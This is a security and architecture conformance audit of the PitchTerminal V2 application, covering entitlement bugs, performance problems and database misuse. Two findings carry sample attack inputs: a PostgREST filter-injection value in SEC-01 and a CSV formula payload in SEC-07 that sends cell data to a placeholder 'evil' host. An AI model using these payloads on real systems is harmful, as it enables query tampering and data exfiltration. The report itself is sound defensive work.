# PitchTerminal V2 — Phase 7: Application Conformance Audit

Audit of the application codebase against the approved database architecture.

**Authority order.** Phase 4 Logical Model → Document 08 Revision 1 → the approved migration set (Revision 2) → PostgreSQL 16 → Supabase → application source code. The application conforms to the database; it does not redefine what the database enforces.

**Sources audited.**

| Tree | Files | Last change |
|---|---|---|
| `beta/backend/src` | 64 TypeScript files, ~23k lines | 2026-08-02 |
| `beta/live-frontend/src` | 98 TS/TSX files, ~10k lines | 2026-08-02 |
| `beta/migrations/`, `beta/backend/supabase/migrations/` | migration history | — |

`beta/frontend/`, `backend/`, `frontend/` and `pitch-frontend/` are older trees (last touched 2026-07-26/28) superseded by the two above. They are excluded; if any is still deployed, that must be resolved before launch and every finding below applies to it at least as strongly.

---

# A. Executive Summary

**The application has zero adoption of the approved architecture.** Not one schema-qualified reference to `football`, `feature`, `module`, `snapshot`, `calibration`, `product` or `operations` exists in either tree. Not one V2 relation is read or written. `product.fn_resolve_entitlements` — the sole entitlement path F-21 mandates — is not called anywhere. Every one of the ~100 write sites and ~150 read sites targets the V1 92-table `public` schema.

This is not a criticism of the application. Phase 6.1 delivered a schema that has not been deployed, and the application is the working product that revealed the requirements for it. But it fixes the shape of this audit: **there is no conformance to measure, only a gap to size.** The findings below therefore serve two purposes — they identify what must change to reach the approved architecture, and they identify defects that are live in production *today* against the V1 schema, independent of V2.

Six defects are live now and do not wait for V2:

| | Finding | Severity |
|---|---|---|
| **SEC-01** | PostgREST filter injection on a **public, unauthenticated** search parameter | **High** |
| **SEC-02** | Admin-granted subscriptions **never expire** — the writer and the reader use different columns | **High** |
| **SEC-04** | No session-refresh middleware; `@supabase/ssr` requires one | Medium |
| **SEC-05** | No security headers of any kind | Medium |
| **SEC-07** | CSV formula injection in the user export | Medium |
| **PERF-01** | 31 database round trips per match page, on 24 of 29 pages marked `force-dynamic` | High impact |

Against the approved architecture, the gap is structural rather than incidental. The application's write model is **update-in-place** (78 `.upsert()` calls); V2's is **append-only and versioned**. Under V2 the majority of those upserts do not degrade — they **raise**, because `INSERT … ON CONFLICT DO UPDATE` fires the append guard (R-19) and the seal guard (R-23), which admit no exception. The migration is a rewrite of the write path, not a search-and-replace of table names.

Two genuine strengths must be preserved through that rewrite. `process:all-db` is a strictly dependency-ordered, zero-API, idempotent L1→L6 pipeline — the discipline V2's job ledger is designed to record, already present. And the server/client boundary is clean: the module evaluation logic, the hardcoded baselines and the entitlement context never reach the browser bundle.

**Verdict: Not Ready for Deployment.** Stated in full in §H.

---

# B. Architecture Conformance

Every deviation from the approved architecture, with evidence.

## AC-01 — The approved schema is not used anywhere

**Evidence.** Schema-qualified references to the seven design schemas in application code: **0**. References to `fn_resolve_entitlements`, `p_landing`, `p_team_state`, `snapshot.match_snapshot`, `feature.feature_value`, `module.module_reading`: **0** (15 apparent matches are all the V1 table `team_match_snapshots`).

The application addresses `public` exclusively, through PostgREST, with unqualified table names.

**Required.** Every read and write repointed. This is the parent of most findings below and is not separable from them.

## AC-02 — Modules exist only as frontend TypeScript, with hardcoded published rates

**Evidence.** `beta/live-frontend/src/lib/modules.ts`, 1,587 lines. The thirteen-module registry is a TypeScript array; each module's reading is computed at request time by a local `eval*` function. Published evidential claims are literals:

```ts
// lib/modules.ts:732 — evalRest
baseline: {
  rate: homeRate,
  sample: 1179,
  pooled: true,
  label: "home wins in this scenario",
  provenance: "unreplayed",
},
```

```ts
// lib/modules.ts:747 — evalBttsFatigue
if (ar >= 7 && hr < 7)      { scenario = "Away rested only";  rate = 60.0; }
else if (hr >= 7 && ar >= 7){ scenario = "Both rested";       rate = 53.9; }
else if (hr < 7 && ar < 7)  { scenario = "Both fatigued";     rate = 52.7; }
else                        { scenario = "Home rested only";  rate = 51.3; }
```

**Why this is the most serious deviation.** These are the numbers a paying subscriber reads as *"historical rate, sample size, confidence interval"*. They are:

- **Not versioned.** Phase 4 E3.02 Module Version does not exist. A rule change is invisible.
- **Not measured.** `provenance: "unreplayed"` is the code's own admission. LC-133 requires that *every published rate passes a declared gate or is marked unverified* — `calibration.sample_gate` and `calibration.published_baseline` exist for exactly this, and neither is consulted.
- **Not keyed by module version.** LC-135 requires a calibration series keyed by module version, without which a rule change silently mixes two rules into one statistic. There is no module version to key by.
- **Not recorded.** LC-86 requires every sealed reading to be individually addressable. `snapshot.snapshot_module_reading` has no writer.
- **Not reproducible.** The reading is recomputed on every page view from current data. Asking "what did module 9 say about this fixture at T-3?" is unanswerable.

**Required.** `module.module_definition`, `module.module_version`, `module.module_reading`, `module.module_evidence`, `module.module_evidence_item` become the source; `calibration.published_baseline` supplies every rate and sample; the frontend renders what it is given and computes nothing.

## AC-03 — Entitlement logic is reimplemented in the application

**Evidence.** `lib/access.ts:169`:

```ts
export function canAccessFeature(ctx: AccessContext, feature: FeatureKey | string): boolean {
  if (!ctx.subscriptionsEnabled) return true;
  if (ctx.isAdmin) return true;
  const required = ctx.required[feature];
  if (!required) return true;                       // unregistered feature stays open
  return ctx.planRank >= (ctx.rank[required] ?? 0);
}
```

The application reads `platform_settings`, `feature_permissions` and `subscription_plans`, builds two lookup maps, and performs the rank comparison itself. `FEATURE_BY_MODULE` (`lib/access.ts:25`) is a second hardcoded mapping table.

F-21 requires a **single** entitlement resolution path. The approved implementation is `product.fn_resolve_entitlements(uuid)` — `SECURITY INVOKER`, `STABLE`, consulted from the RLS policy on each projection relation, so a gated row is never returned to begin with. The application implements a parallel path and does not call the approved one.

**This is the failure mode Phase 1 recorded in V1**: two entitlement paths live simultaneously. The application currently carries the second one.

**Required.** Delete `canAccessFeature`, `FEATURE_BY_MODULE`, `required`, `rank` and `planRank`. Read `product.p_landing` / `product.p_team_state`, which return only rows the caller is entitled to.

## AC-04 — There is no snapshot lifecycle

**Evidence.** The nearest V1 equivalents are written as mutable rows:

```ts
// jobs/processHistoricalContext.ts:672
await upsertBatchedWithRetry('team_match_snapshots', snapshotRows, 'match_id,team_id');
```

```ts
// jobs/archiveReadinessHistory.ts:306 — linkReadinessResults()
const { error: updErr } = await db.from('readiness_history').update({
  result_linked_at: nowIso,
  final_home_score: res.home_score,
  final_away_score: res.away_score,
  final_outcome: outcome,
  pick_correct_strict: strict,
  pick_correct_lenient: lenient,
}).eq('id', snap.id);
```

`archiveReadinessHistory.ts` is the platform's accountability layer and its own header states the intent correctly — *"writes an IMMUTABLE pre-match snapshot"*, *"Never touches the frozen prediction columns"*. The intent is right; the mechanism is an `UPDATE` against the archived row.

Under V2 this statement raises. R-23: *the sealing guard admits no exception whatsoever — it raises on update and on delete for every principal including the retention role.* Verified firing in Phase 6.1 §14.3.

Correction **A.2** exists precisely for this operation: outcome attachment is an **insert** into `snapshot.snapshot_outcome_link`, with revision by **ordinal succession** into `snapshot_outcome_link_currency`, written by `pt_pipeline_calibration`, which holds `INSERT` on those two relations **and on no other relation in the schema** (R-67).

**Required.** No sealing exists today; it must be built, not ported. `linkReadinessResults` becomes an insert into the outcome-link pair.

## AC-05 — Thirteen read-path relations are undefined in the repository

**Evidence.** Every module names a source view that exists nowhere in `Schema.sql`, `beta/migrations/` or `beta/backend/supabase/migrations/`:

| Undefined | Referenced from |
|---|---|
| `mv_module_home_away`, `mv_module_readiness_tracker`, `mv_module_consistency`, `mv_module_giant_killer`, `mv_module_travel`, `mv_module_rest`, `mv_module_league_goals`, `mv_module_form_gap`, `mv_module_btts_fatigue`, `mv_module_confidence`, `mv_module_halftime`, `mv_module_clean_sheet` | `lib/modules.ts` — all thirteen module definitions |
| `mv_match_scoring_probabilities` | `lib/queries.ts:155`, `:347` |

A refinement to the Phase 1 checklist, in the application's favour: the ten **non-`mv_`** relations flagged there — `match_opportunity`, `match_risk_intelligence`, `match_half_time_intelligence`, `match_impact_advantage`, `match_key_battles`, `match_positional_matchups`, `match_tactical_advantages`, `match_performance_comparison`, `substitution_impact`, `match_squad_depth_comparison` — **are** defined in `beta/migrations/`. They are absent only from the supplied `Schema.sql` dump. The thirteen `mv_*` above are genuinely undefined everywhere.

Compounding: **nothing in the repository refreshes them.** `grep -rn "REFRESH MATERIALIZED"` across the backend returns nothing. Their staleness is unbounded and unobservable.

**Required.** Recover the definitions from production before anything else. Production is not reproducible from this repository, and what cannot be reproduced cannot be migrated.

## AC-06 — One omnipotent credential, where the architecture specifies seven roles

**Evidence.** `beta/backend/src/db/client.ts:14`:

```ts
supabaseInstance = createClient(config.supabase.url, config.supabase.serviceKey, {
  auth: { autoRefreshToken: false, persistSession: false },
});
```

Every job — ingestion, feature calculation, module generation, archiving, backtesting — uses one **service-role** key. On Supabase that role carries `BYPASSRLS`.

The approved architecture creates `pt_pipeline_ingestion`, `pt_pipeline_feature`, `pt_pipeline_module`, `pt_pipeline_calibration`, `pt_pipeline_projection`, `pt_retention` and `pt_platform_admin` (R-57, A.14, §B.7.1), each holding only the privileges its layer requires, over **direct connections in session mode** (R-58) — not through PostgREST. The entire privilege and policy matrix verified in Phase 6.1 §14 is inert against a `BYPASSRLS` connection.

Concretely lost: the calibration role's inability to create snapshots (R-67); the ingestion role's lack of `UPDATE` on append-only football relations (P-06, verified false in §14.2); retention's exclusive `DELETE` under the session marker (R-20/R-22).

**Required.** Seven credentials, direct connections, session mode. The retention marker of R-21 depends on session mode and cannot work through a transaction pooler.

## AC-07 — The operational layer has no writer

**Evidence.** Tables written by the backend, by frequency: `matches` (75), `teams` (27), `players` (22) … and `platform_daily_summary` (1). No writes to any job-run, sync, error, or quota structure. Scheduling is external cPanel cron invoking CLI verbs (`cli.ts:1638`); there is no in-repo schedule definition, no retry policy, no run ledger.

V2 defines `operations.pipeline_run`, `pipeline_job_run`, `write_record`, `failure`, `failure_resolution`, `api_usage`, `quality_assertion_result` and `operational_aggregate`. All eight are unwritten.

This matters beyond telemetry. `snapshot.match_snapshot.pipeline_job_run_id` and `calibration.calibration_run.pipeline_job_run_id` are **composite references to a job run** (P-04). A sealed snapshot must name the job that produced it. With no job runs recorded, nothing can be sealed.

## AC-08 — Calibration is not keyed to anything versioned

**Evidence.** `signal_backtests` (3 write sites) and `confidenceBand.ts` are real evidence machinery — `confidenceBand.ts` guarantees the published formula and the backtested formula are byte-identical, which is a genuine strength. But `backtestSignals.ts` measures `match_signals`, and no module has a version, so no series can be keyed by module version (LC-135). Phase 1 recorded this as *"good machinery applied to one of the models it shipped"*; it remains so.

---

# C. Security Findings

## Critical

None. The absence of a payment provider and the absence of any service-role key in the frontend bundle remove the two most severe categories.

## High

### SEC-01 — PostgREST filter injection on a public search parameter

`lib/queries.ts:1220`, reached from `/teams?q=` and `/trends`, **unauthenticated**:

```ts
const { data: matches } = await client
  .from("teams")
  .select("id")
  .or(`name.ilike.%${opts.q.trim()}%,short_name.ilike.%${opts.q.trim()}%`);
```

`opts.q` is interpolated raw into a PostgREST `or=` expression. A comma terminates the `ilike` value and begins a new condition, so an attacker controls the predicate: `?q=x,id.gt.0` produces `or(name.ilike.%x, id.gt.0%, short_name.ilike…)`. Arbitrary columns of `teams` can be filtered on, and expensive predicates can be forced.

The same pattern is in `lib/admin.ts:128` against `user_profiles`, admin-gated.

This is **not** SQL injection — PostgREST parameterises the underlying SQL, and RLS still bounds the result. `teams` holds no confidential data, which is what keeps this High rather than Critical. The pattern is the finding: the identical helper against a table that does hold confidential data would be Critical, and one of the two call sites already targets the user table.

**Fix.** Escape PostgREST reserved characters (`, . ( ) : "`) or, better, use `.textSearch()` / a single `.ilike()` per column combined with `.or()` built from sanitised parts. Reject `q` containing anything outside `[\p{L}\p{N} '\-]`.

### SEC-02 — Admin-granted subscriptions never expire

The writer and the reader use different columns of the same table.

`user_subscriptions` carries **both** `expires_at` (original, `beta/migrations/…user_subscriptions`) and `current_period_end` (added by `035_product_infrastructure.sql:156`).

`lib/admin.ts` writes and reads `current_period_end`:

```ts
// :490
const base = (existing as any)?.current_period_end
  ? new Date((existing as any).current_period_end)
// :496
  .update({ current_period_end: next.toISOString() })
```

`lib/access.ts` — the file that decides entitlement — reads `expires_at`:

```ts
// :107
.select("status, expires_at, plan:subscription_plans(slug)")
// :115
const live = !row.expires_at || new Date(row.expires_at) > new Date();
```

An admin grants or extends Pro → `current_period_end` is set, `expires_at` stays `NULL` → `live = !null` → **`true`, permanently**. The admin console displays a `renewsAt` (`admin.ts:231`) that has no bearing on access. Conversely, a lapsed `current_period_end` still evaluates as live.

Revenue-affecting, live today, and invisible because it fails **open**.

**Fix now.** Point `access.ts` at `current_period_end`, or backfill and drop one column. **Fix properly.** V2 collapses both into one `tstzrange` and evaluates `now() <@ s.subscription_period` inside `fn_resolve_entitlements` — the class of bug disappears because there is one column and one evaluator.

### SEC-03 — Service-role key bypasses every database guarantee

See **AC-06**. Classified as a security finding because it is one: a single leaked credential grants unrestricted read and write across every table, and no policy in the approved set constrains it. The triggers (append guard, seal guard) would still fire — they are triggers, not RLS — but the privilege matrix would not.

## Medium

### SEC-04 — No session-refresh middleware

No `middleware.ts` exists anywhere in `beta/`. `@supabase/ssr` requires middleware to rotate the refresh token, and `lib/supabase/server.ts:26` documents the consequence honestly:

```ts
setAll: (list) => {
  if (!writable) return;      // Server Components cannot set cookies
  …
  // Render context — the refresh will be persisted by the next action.
```

There may be no next action. A user who only browses server-rendered pages never triggers a Server Action or Route Handler, so the rotated token is never persisted and the session silently expires mid-visit. Users are logged out at unpredictable moments.

Correct in this file: `getSessionUser()` uses `auth.getUser()`, which revalidates against the auth server, not `getSession()`, which trusts the cookie. That is the right choice and should be kept.

### SEC-05 — No security headers

`next.config.ts` sets `output`, `basePath` and `assetPrefix` and nothing else. No `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`, `X-Content-Type-Options` or `Referrer-Policy` — on an application that sets auth cookies and will take payment.

### SEC-06 — Entitlement resolution fails open, twice

```ts
// lib/access.ts:142
} catch {
  subscriptionsEnabled = false;   // a failed settings read opens everything
}
// lib/access.ts:175
if (!required) return true;       // an unregistered feature stays open
```

Both defaults are argued in comments, and both arguments are reasonable for a beta. Neither is acceptable once subscriptions are live: a transient database error becomes a platform-wide entitlement bypass, and a typo in a feature key silently unlocks a paid module.

Under V2 this is moot — the database returns no gated row regardless of what the application concludes.

### SEC-07 — CSV formula injection in the user export

`lib/admin.ts:698`:

```ts
const esc = (v: string | null) => `"${(v ?? "").replace(/"/g, '""')}"`;
```

Quoting and doubling is correct CSV escaping and does nothing about leading `=`, `+`, `-`, `@`, `\t`, `\r`. `display_name` is user-controlled. An attacker sets their display name to `=HYPERLINK("https://evil/"&A1,"click")`, an administrator opens the export in Excel or Sheets, and the formula executes with the exported user data available to it.

**Fix.** Prefix any cell beginning with those characters with `'`.

### SEC-08 — Entitlement redaction happens after the data is fetched

`redactReadings` (`lib/access.ts:200`) and `redactTeamInputs` (`:387`) strip gated content from an already-materialised result set. The comment is candid and correct — *"Hiding a card in the UI is not enforcement"* — and stripping before serialisation is genuinely better than hiding in CSS.

It is still weaker than the approved design. F-05 and §B.7.6 put `required_entitlement_key` on the projection relation with an RLS policy consulting `fn_resolve_entitlements`, so gated rows never leave PostgreSQL. Today the premium values are read into the Node process on every request, and a single logic error in one of the two redaction functions leaks them.

## Low

### SEC-09 — The user export silently truncates to 100 rows

`exportUsersCsv` calls `listUsers({ …filters, page: 1, pageSize: 100 })`. On a platform with more users, "Export" produces the first 100 with no warning. A correctness defect with compliance consequences if the export is ever used to answer a data-subject request.

### SEC-10 — Thirty-five empty catch blocks

`grep -c "catch {"` returns 35 across the frontend. Several are deliberate and documented. Collectively they mean a failing database, an expired credential and an empty table are indistinguishable to an operator — and there is no `error.tsx` or `global-error.tsx` anywhere, so a thrown error renders the default Next.js page.

---

# D. Performance Findings

### PERF-01 — 31 round trips per match page, uncached — **High impact**

`getMatch()` (`lib/queries.ts:222–300`) issues **31** separate PostgREST requests for a single fixture: `match_intelligence`, `match_opportunity`, `match_risk_intelligence`, `match_signals`, `match_weather`, `match_results`, `match_half_time_intelligence`, `team_match_impact` ×2, `match_impact_advantage`, `match_key_battles`, `match_positional_matchups`, `match_tactical_advantages`, `match_performance_comparison`, `substitution_impact`, `match_squad_depth_comparison`, `team_betting_intelligence` ×2, `team_intelligence` ×2, `team_season_statistics` ×2, `team_form_quality` ×2, `team_venue_performance` ×2, `mv_module_travel`, `players` ×2, `team_injury_impact` ×2.

Ten of these are the same table queried twice — once per side — where one `.in([homeId, awayId])` would do.

And **24 of 29 pages** carry `export const dynamic = "force-dynamic"`. There is no `revalidate`, no `unstable_cache`, no HTTP caching. Every request re-runs all 31 queries against data that changes a few times a day.

**Estimated impact.** At ~15 ms per PostgREST round trip, ~465 ms of serial-ish latency per match view before rendering, entirely repeated per visitor. This is the pattern Doc 08 §B.13.3 names explicitly as *"the previous platform's costliest read pattern, in which a single fixture required ~30 independent round trips"* — measured here at 31.

**Fix.** Under V2 this is **one** partition-pruned, partition-wise gather across the co-partitioned sealed family — which is why match intelligence deliberately has no projection. Before V2: batch the ten paired queries, and cache the intelligence reads separately from the identity read.

### PERF-02 — Unbounded intermediate result in public search — **Medium-High impact**

`getTeamDirectory` (`lib/queries.ts:1216`) selects **every** matching team id with no `.limit()`, materialises them in Node, then passes the whole array to `.in()`. A two-character query like `?q=fc` matches thousands of rows, and the follow-up `.in()` embeds every id in a URL. Unbounded memory, and a request-URI-too-long failure at scale. Public and unauthenticated — the same entry point as SEC-01.

### PERF-03 — Per-row UPDATE loop in the accountability layer — **Medium impact**

`archiveReadinessHistory.ts:306` sits inside `for (const snap of unlinked)` with an `await` per row. Every finished fixture awaiting a result link costs one round trip. A weekend backlog of 500 fixtures is 500 sequential writes.

### PERF-04 — Identity resolved repeatedly per request — **Medium impact**

`getAccessContext()` performs five reads (`platform_settings`, `feature_permissions`, `subscription_plans`, `user_profiles`, `user_subscriptions`) plus an `auth.getUser()` network call. `getViewerIdentity()` performs two more plus its own `auth.getUser()`. A page calling both — the layout calls the second, the page the first — issues **two** auth-server round trips and seven database reads before any content is fetched. None is memoised per request; `React.cache()` would eliminate the duplication in one line.

### PERF-05 — Global cache invalidation on a star click — **Low impact today**

`preferences.ts:50`: `revalidatePath("/", "layout")` on every watchlist or favourite-league toggle invalidates the entire application. With `force-dynamic` everywhere there is nothing to invalidate, so the cost is currently nil — but it becomes severe the moment caching is introduced, which PERF-01 requires.

### PERF-06 — Materialised views are never refreshed — **Unbounded staleness**

No `REFRESH MATERIALIZED VIEW` anywhere in the backend. Thirteen `mv_*` relations are read on the primary paths. Either refresh happens outside the repository, or the module readings shown to users are arbitrarily stale, and nothing distinguishes the two.

---

# E. Database Misuse

Every place the application violates a guarantee the approved database makes.

### DB-01 — The write model is update-in-place; the approved model is append-only

**78 `.upsert()` calls**, against 34 distinct tables including `match_intelligence`, `team_intelligence`, `match_signals`, `team_form_history`, `team_intelligence_history`, `player_intelligence` and `signal_backtests`.

Under V2, `INSERT … ON CONFLICT DO UPDATE` on an append-only relation fires the append guard, which raises unconditionally for every principal (R-19) — verified firing in Phase 6.1 §14.3. On a sealed relation the seal guard raises (R-23). On the three append-only `football` relations the pipeline role holds no `UPDATE` privilege at all (P-06, verified in §14.2).

These upserts do not degrade under V2. They **fail**. That is the correct behaviour and the reason V2 exists — Phase 1 recorded that 17 team-level tables were one row per team overwritten in place, with no history and no point-in-time recovery.

### DB-02 — UPDATE against the immutability-locked archive

`archiveReadinessHistory.ts:306`. Detailed in **AC-04**. The single clearest instance of the application performing an operation the approved database forbids absolutely.

### DB-03 — Multi-statement operations are not transactional

One `.rpc()` exists in the entire backend:

```ts
// jobs/processDbOnly.ts:204
const { error } = await db.rpc('replace_player_match_load', { p_rows: rows });
// :199 — "single-transaction replace via RPC (migration 024). The old
//          delete()+insert() pair was two PostgREST transactions"
```

The team identified the limitation and fixed it in exactly one place. Everywhere else — including `applyPlanAction` (`admin.ts:431`), which performs a select, an update, a subscription-event insert and an audit-log insert as four independent transactions — a partial failure leaves inconsistent state with no rollback.

Sealing a snapshot under V2 is inherently multi-statement: the manifest, the feature states, the module readings, the verdict, the completeness record and the checksum must commit together or not at all. **PostgREST cannot express that.** Sealing requires a direct connection or a `SECURITY DEFINER` function, not `supabase-js`.

### DB-04 — Reliance on undefined ordering

```ts
// lib/queries.ts:270–271
client.from("team_season_statistics").select("*").eq("team_id", homeTeam.id)
      .order("season_external_id", { ascending: false }).limit(1).maybeSingle(),
```

`team_season_statistics` has `PRIMARY KEY (id)` and carries a nullable `tournament_id`; there is no unique constraint on `(team_id, season_external_id)`. A team playing a league and a cup in the same season has **two rows with the same `season_external_id`**, and `.limit(1)` returns whichever the planner produces first. The season statistics shown on the match page are non-deterministic and can differ between two consecutive requests for the same fixture.

The same pattern applies to `team_betting_intelligence` (`:266–267`).

Every other `.limit()` in the codebase is correctly paired with an `.order()` — this is a uniqueness failure, not a missing sort.

### DB-05 — Composite keys are not used

Every reference in the application is single-column: `.eq("match_id", id)`, `.eq("team_id", teamId)`. Under V2, correction **A.1 / R-01** makes every reference to a partitioned relation composite — `(match_snapshot_id, fixture_partition_on)`, `(id, as_of)`, `(pipeline_job_run_id, pipeline_job_run_occurred_at)`. No application query is shaped for this.

### DB-06 — No query carries a partition predicate

No read in either tree filters on `fixture_partition_on`, `as_of` or any partition key. §5.10.6 makes a partition predicate mandatory on a partitioned relation, and **F-15** registers a pruning-conformance quality check that detects violations. Every current match, feature and snapshot read would fail that check and scan every partition.

### DB-07 — Business rules duplicated from the database into TypeScript

Consistent with the instruction *"do not duplicate logic already enforced by PostgreSQL"*, three duplications should be deleted rather than ported:

| Application logic | Enforced by |
|---|---|
| `canAccessFeature` rank comparison (`access.ts:169`) | `product.fn_resolve_entitlements` + RLS policy (F-21) |
| Subscription liveness `!row.expires_at \|\| … > new Date()` (`access.ts:115`) | `now() <@ s.subscription_period` inside the function |
| `boardLimit()` per-tier row caps (`access.ts:427`) | the projection's RLS policy — a limit the database applies cannot be bypassed by a caller |

---

# F. Production Risks

| # | Risk | Consequence |
|---|---|---|
| **PR-1** | Thirteen read-path relations exist only in production | Production cannot be reproduced, restored, or migrated from this repository. A dropped view is unrecoverable. |
| **PR-2** | No monitoring, no alerting, no error boundaries | 3 `console` statements, no Sentry/OTel, no `error.tsx`. A pipeline that stops writing is invisible until a user reports missing data — and because calculation is append-only and absences are silent, a failed run leaves a permanent hole. `operations.v_coverage` exists to make this visible and has no data to read. |
| **PR-3** | Cron via cPanel with no ledger, retry or recovery | A missed or half-completed `process:all-db` leaves L1–L3 committed and L4–L6 absent, with no record of where it stopped and no mechanism to resume. |
| **PR-4** | Session expiry mid-visit (SEC-04) | Users logged out unpredictably; support burden, and the cause is not visible in any log. |
| **PR-5** | No payment provider | Honestly disclosed in the UI (`subscription/page.tsx:152`). Subscriptions are admin-granted only — which is how SEC-02 stays latent, and why it will surface the moment billing is connected. |
| **PR-6** | Three superseded application trees still in the repository | `beta/frontend`, `frontend`, `pitch-frontend`. If any is deployed, every finding here applies to code nobody is auditing. |
| **PR-7** | Materialised views with no refresh path | Users may be reading arbitrarily stale intelligence with no staleness indicator. Under V2 this is `product.fn_refresh_projection_views()` plus the freshness assertion; today nothing. |

---

# G. Required Fixes

Prioritised. Group 1 is independent of V2 and should be done regardless.

## Group 1 — Live defects, fix now (days)

| # | Fix | Finding |
|---|---|---|
| 1 | Point `lib/access.ts` at `current_period_end`, or consolidate the two columns. Add a test asserting a lapsed subscription is not live. | SEC-02 |
| 2 | Sanitise or escape `q` before it reaches `.or()`, in both `queries.ts:1220` and `admin.ts:128`. Add `.limit()` to the search id-materialisation. | SEC-01, PERF-02 |
| 3 | Add `middleware.ts` with the Supabase SSR session refresh. | SEC-04 |
| 4 | Add security headers in `next.config.ts`. | SEC-05 |
| 5 | Prefix `= + - @` in CSV cells; paginate the export rather than truncating at 100. | SEC-07, SEC-09 |
| 6 | Add `error.tsx` and `global-error.tsx`; route the 35 swallowed errors to a logger. | SEC-10, PR-2 |
| 7 | Disambiguate `team_season_statistics` and `team_betting_intelligence` with `tournament_id` or a deterministic tiebreak. | DB-04 |

## Group 2 — Recover what only production knows (days, blocking)

| # | Fix | Finding |
|---|---|---|
| 8 | Dump the thirteen `mv_*` definitions from production into `beta/migrations/` and establish their refresh path. | AC-05, PR-1, PERF-06 |
| 9 | Confirm which application trees are deployed; delete or archive the rest. | PR-6 |

**Nothing in Group 3 can be planned accurately until item 8 is done.** Thirteen undefined relations feed the module layer, which is the part of the application V2 changes most.

## Group 3 — Conformance to the approved architecture (weeks–months)

In dependency order.

| # | Fix | Finding |
|---|---|---|
| 10 | Split the service-role key into the seven pipeline roles on direct session-mode connections. Retire `supabase-js` for pipeline writes. | AC-06, SEC-03, DB-03 |
| 11 | Write `operations.pipeline_run` / `pipeline_job_run` / `write_record` / `failure` / `api_usage` from every job. Nothing can be sealed until job runs exist. | AC-07, PR-3 |
| 12 | Move the module registry, versions, readings and evidence into the `module` schema. Move every hardcoded rate and sample into `calibration.published_baseline` behind `sample_gate`. `lib/modules.ts` becomes a renderer. | AC-02 |
| 13 | Build snapshot sealing: transactional, insert-only, checksummed, job-attributed. Replace `linkReadinessResults`' UPDATE with an insert into `snapshot_outcome_link` + ordinal succession in `snapshot_outcome_link_currency` (A.2). | AC-04, DB-02 |
| 14 | Convert the 78 upserts to append-only inserts against `feature.feature_value` / `module.module_reading` with `(as_of, version)` identity. | DB-01 |
| 15 | Delete `canAccessFeature`, `FEATURE_BY_MODULE`, `boardLimit` and the two `redact*` functions. Read `product.p_landing` / `p_team_state`; entitlement is decided by RLS. | AC-03, SEC-06, SEC-08, DB-07 |
| 16 | Replace `getMatch()`'s 31 queries with one partition-pruned gather across the co-partitioned sealed family. Add partition predicates to every read. | PERF-01, DB-05, DB-06 |
| 17 | Replace `force-dynamic` everywhere with per-page `revalidate`; memoise identity with `React.cache()`; narrow `revalidatePath`. | PERF-01, PERF-04, PERF-05 |

**Preserve through all of this:** the dependency-ordered idempotent `process:all-db` pipeline; the byte-identical published/backtested formula guarantee in `confidenceBand.ts`; `auth.getUser()` over `getSession()`; session-derived `user_id` in every preference write; the clean server/client boundary that keeps module logic and entitlement context out of the browser bundle.

---

# H. Final Verdict

## **Not Ready for Deployment**

Against the approved architecture, the application has **zero conformance** — no V2 schema is referenced, no V2 relation is read or written, and the mandated entitlement path is not called. The write model is structurally opposed to the approved one: 78 upserts against relations that under V2 raise rather than accept them. Sealing, calibration keyed to versions, and the operational layer do not exist and must be built rather than ported. This is not a gap that closes with a rename.

The verdict does not rest only on V2. Three defects are live in production today: entitlements that never expire because the writer and the reader use different columns, a filter-injection vector on an unauthenticated public parameter, and sessions that expire mid-visit for want of a middleware file. A fourth — thirteen relations that exist only in production — means the deployed system cannot currently be reproduced from its own repository. Each is independently disqualifying for a subscription product about to connect billing.

The application is a capable prototype whose limits are exactly the ones Document 08 was written to remove. Its ordering discipline, its formula-integrity guarantee and its server/client hygiene are real and should survive the rewrite. But conformance to the approved architecture requires the pipeline, the module layer and the write path to be rebuilt against it, and none of that work has started.

**Re-audit after Group 1 and Group 2 are complete** — that will lift the live defects and make Group 3 estimable. A second verdict is warranted at that point, and *Requires Remediation* is a realistic outcome once the production-only relations are recovered and the entitlement expiry defect is closed.
